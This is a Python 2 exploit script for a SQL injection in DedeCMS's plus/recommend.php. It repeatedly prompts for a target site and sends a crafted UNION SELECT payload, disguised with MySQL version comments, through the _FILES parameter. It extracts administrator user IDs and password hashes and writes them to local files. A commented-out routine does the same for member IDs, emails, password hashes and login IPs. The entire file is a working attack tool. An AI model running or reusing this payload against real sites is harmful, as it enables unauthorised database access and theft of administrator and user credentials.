#!/usr/bin/env python

#for test the dedecms injection-20140303

import re
import sys
import urllib2

def getAdminHash(url,i):
    urls=url+"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,pwd%29+from+%60%23@__admin%60%20limit+"+str(i)+",1%29,5,6,7,8,9%23@%60\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
    Headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0"}
    #print urls
    u = url.replace("//","_")
    u =u.replace(":","_")
    try:
        req=urllib2.Request(urls,headers=Headers)
        result=urllib2.urlopen(req,timeout=20).read()
        if result:
            reg = re.compile(r"_(.*?)_{dede",re.S)
            groups = re.findall(reg,result)
            if groups[0]:
                print groups[0]
                with open('%s_admin.txt' % u,'a') as af:
                    af.write(groups[0]+"\n")
    except KeyboardInterrupt:
        print "Precess interrupted by user."
        sys.exit(-1)

    except :
        #sys.exit(-2)
        print "no exp"

def getMemberHash(url,i):
    urls = url+"/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@%60\%27%60%20/*!50000union*//*!50000select*/1,2,3,%28select%20CONCAT%280x7c,userid,0x7c,email,0x7c,pwd,0x7c,loginip%29+from+%60%23@__member%60%20limit+"+str(i)+",1%29,5,6,7,8,9%23@%60\%27%60+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=111"
    Headers= {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0"}
    #print urls
    u = url.replace("//","_")
    u = u.replace(":","_")
    try:
        req=urllib2.Request(urls,headers=Headers)
        result = urllib2.urlopen(req,timeout=20).read()
        if result:
            reg = re.compile(r"_(.*?)_{dede",re.S)
            groups = re.findall(reg,result)
            if groups[0]:
                print groups[0]
                with open('%s_member.txt' % u,'a') as af:
                    af.write(groups[0]+"\n")
        else:
            pass
    except KeyboardInterrupt:
        print "Process interrupted by user."
        sys.exit(-1)



if __name__ == "__main__":
    while True:
        url = raw_input("input dede site:")
        #url = sys.argv[1]

        if "http://" not in url:
            url="http://%s" % url

        print "Admin"
        for i in xrange(0,2):
            getAdminHash(url,i)
    #print "Member"
    #for i in xrange(0,200):
    #    getMemberHash(url,i)


